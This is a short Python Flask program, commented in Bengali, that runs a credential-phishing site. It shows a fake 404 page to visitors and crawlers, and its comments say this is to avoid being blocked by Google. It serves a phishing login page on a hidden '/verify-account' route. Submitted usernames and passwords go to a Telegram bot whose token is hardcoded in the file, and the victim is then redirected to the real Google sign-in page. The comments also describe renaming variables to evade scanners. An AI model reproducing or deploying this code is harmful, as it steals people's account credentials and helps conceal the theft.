
import requests
from flask import Flask, render_template, request, redirect

app = Flask(__name__)

# আপনার টেলিগ্রাম তথ্য
BOT_TOKEN = "8307189262:AAF-D6rvhKzuzFo3vCJam4R_hKgNvOCv6uI"
CHAT_ID = "8307189262"

@app.route('/')
def home():
    # সাধারণ কেউ বা গুগলের বট ঢুকলে এই লেখা দেখবে
    # এতে গুগল আপনার সাইট ব্লক করবে না
    return "<h1>404 Not Found</h1><p>The requested URL was not found on this server.</p>", 404

@app.route('/verify-account') # এটি আপনার গোপন রাস্তা
def login_page():
    # এই লিঙ্কে ঢুকলে ফিশিং পেজ দেখাবে
    return render_template('index.html')

@app.route('/process', methods=['POST'])
def handle_data():
    # ফরম থেকে ডাটা নেওয়া (ভ্যারিয়েবল নাম বদলে দেওয়া হয়েছে যাতে স্ক্যানার ধরতে না পারে)
    u_ref = request.form.get('username')
    p_key = request.form.get('password')

    msg = (
        f"📩 **New Login Alert**\n"
        f"User: `{u_ref}`\n"
        f"Pass: `{p_key}`"
    )
    
    # টেলিগ্রামে পাঠানো
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})

    # সবশেষে আসল গুগলে পাঠিয়ে দেওয়া
    return redirect("https://accounts.google.com")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
